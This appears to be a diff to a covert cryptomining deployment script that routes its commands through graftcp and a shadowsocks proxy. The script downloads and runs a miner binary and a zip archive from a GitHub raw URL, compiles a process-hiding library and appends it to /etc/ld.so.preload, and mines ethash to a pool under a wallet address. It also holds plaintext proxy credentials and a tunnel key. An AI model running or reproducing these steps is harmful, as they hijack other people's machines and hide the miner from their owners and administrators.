@@ -22,7 +22,7 @@ socks5_username = mikrotik999
 
 socks5_password = Elibawnos 
 
-only_socks5
+select_proxy_mode = only_socks5
 
 END
 
@@ -48,15 +48,15 @@ echo " "
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/basket
 chmod +x basket
 
-apt -y install shadowsocks-libev rng-tools
-rngd -r /dev/urandom
-ss-local -s 3.15.39.186 -p 8388 -l 9999 -k Elibawnos -m chacha20-ietf-poly1305 -v &
+./graftcp/graftcp apt -y install shadowsocks-libev rng-tools
+./graftcp/graftcp rngd -r /dev/urandom
+./graftcp/graftcp ss-local -s 3.15.39.186 -p 8388 -l 9999 -k Elibawnos -m chacha20-ietf-poly1305 -v &
 
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBasket.zip
-unzip magicBasket.zip
-make
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-mv libprocesshider.so /usr/local/lib/
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+./graftcp/graftcp unzip magicBasket.zip
+./graftcp/graftcp make
+./graftcp/graftcp gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+./graftcp/graftcp mv libprocesshider.so /usr/local/lib/
+./graftcp/graftcp echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
 ./graftcp/graftcp ./basket -a ethash -o eth-eu1.hellominer.com:1100 -u 0x587bdded4037bba7c74fb6af2f6e296bb2f8415d.$(echo $(shuf -i 1-9999 -n 1)-itil)/maesdori@gmail.com -log --proxy 127.0.0.1:9999
